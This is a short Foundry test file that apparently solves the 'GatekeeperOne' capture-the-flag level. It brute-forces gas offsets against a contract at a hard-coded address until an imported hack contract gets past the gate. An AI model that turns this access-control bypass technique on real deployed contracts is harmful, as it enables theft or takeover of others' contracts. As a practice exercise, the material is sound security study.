// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {GatekeeperOne} from "src/13GatekeeperOne.sol";
import {HackGatekeeperOne} from "script/13GatekeeperOne.s.sol";

contract TestGateKeeperOne is Test {
    GatekeeperOne private target;
    // GatekeeperOne private target;
    HackGatekeeperOne private hack;

    function setUp() public {
        target = GatekeeperOne(0x037e210a2575f2f57207540c3a33AF1C03Eaef39);
        // target = new GatekeeperOne();
        hack = new HackGatekeeperOne();
    }

    function testFindGasOffset() public {
        for (uint256 i = 100; i < 8191; i++) {
            try hack.enter(address(target), i) {
                console.log("gas", i);
                return;
            } catch {}
        }
        revert("all failed");
    }
}
